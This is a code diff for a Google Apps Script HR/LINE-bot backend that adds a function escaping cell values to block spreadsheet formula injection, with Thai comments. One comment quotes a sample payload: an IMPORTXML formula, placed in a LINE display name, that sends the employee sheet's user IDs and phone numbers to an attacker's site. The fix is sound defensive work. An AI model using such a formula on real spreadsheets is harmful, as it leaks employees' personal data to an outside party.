@@ -190,6 +190,31 @@ function headerIndex_(name) {
   return idx;
 }
 
+/**
+ * ทำให้ค่าที่จะเขียนลงชีตปลอดภัย — กัน "formula injection"
+ *
+ * ★ ช่องโหว่ที่ปิดด้วยฟังก์ชันนี้
+ *   ข้อความจากภายนอกหลายทางถูกเขียนลงชีตตรง ๆ ได้แก่ ชื่อที่แสดงใน LINE ของผู้ใช้,
+ *   ชื่อ-นามสกุลที่กรอกตอนยืนยันตัวตน (ซึ่ง "ยังไม่ต้องเป็นพนักงาน" ก็ส่งได้),
+ *   หัวข้อและรายละเอียดของเรื่องที่ส่งถึง HR และเหตุผลการลา
+ *
+ *   Google Sheets ถือว่าข้อความที่ขึ้นต้นด้วย = + - @ คือ "สูตร" ไม่ใช่ข้อความ
+ *   ผู้โจมตีจึงตั้งชื่อ LINE ตัวเองเป็น
+ *       =IMPORTXML("https://เว็บของผู้โจมตี/?x="&JOIN(",",Employees!A2:N70),"//a")
+ *   พอ HR เปิดชีต สูตรจะทำงานเองทันทีโดยไม่ต้องกดอะไรเลย และส่ง lineUserId
+ *   กับเบอร์โทรของพนักงานทุกคนออกไปให้ผู้โจมตี
+ *
+ *   ซึ่งขัดกับกฎเหล็กข้อ 6 ของชีตโดยตรง ("lineUserId ห้ามออกนอกไฟล์นี้")
+ *
+ * วิธีแก้: เติม ' นำหน้า ซึ่งบังคับให้ Sheets มองว่าเป็นข้อความเสมอ
+ * เครื่องหมาย ' ไม่แสดงในเซลล์และไม่ติดมากับค่าที่อ่านกลับ
+ */
+function safeCell_(v) {
+  if (v === null || v === undefined) return '';
+  if (typeof v !== 'string') return v;                    /* ตัวเลข/วันที่ ปล่อยผ่าน */
+  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
+}
+
 /** เพิ่มแถวใหม่จาก object */
 function appendRow(name, obj) {
   var sh   = sheet_(name);
@@ -197,7 +222,7 @@ function appendRow(name, obj) {
   var head = sh.getRange(idx._headRow, 1, 1, sh.getLastColumn()).getDisplayValues()[0];
   var row  = head.map(function (h) {
     var k = String(h).trim();
-    return (obj[k] === undefined || obj[k] === null) ? '' : obj[k];
+    return safeCell_(obj[k]);
   });
   sh.appendRow(row);
   bumpTableVersion_(name);
@@ -211,7 +236,7 @@ function updateRow(name, rowNumber, patch) {
   /* เขียนทีละเซลล์ตามเดิมโดยตั้งใจ — บางแท็บมีคอลัมน์สรุปที่เป็นสูตร
      ถ้าอ่านทั้งแถวแล้วเขียนกลับด้วย setValues สูตรจะถูกทับด้วยค่าคงที่ */
   Object.keys(patch).forEach(function (k) {
-    if (idx[k]) sh.getRange(rowNumber, idx[k]).setValue(patch[k]);
+    if (idx[k]) sh.getRange(rowNumber, idx[k]).setValue(safeCell_(patch[k]));
   });
   bumpTableVersion_(name);
 }
